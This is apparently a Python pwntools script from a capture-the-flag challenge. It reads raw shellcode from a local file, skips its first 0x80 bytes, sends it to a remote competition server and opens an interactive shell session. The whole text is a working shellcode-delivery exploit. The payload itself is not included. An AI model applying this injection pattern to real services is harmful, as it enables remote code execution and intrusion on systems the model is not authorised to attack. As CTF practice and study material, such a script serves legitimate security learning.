import sys
import socket
import binascii
from pwn import *

sc = open("shellcode", "rb").read()[0x80:]

r = remote("covert.tghack.no", 6060)

print "shellcode size: {}".format(len(sc))
r.sendline(sc)

r.interactive()
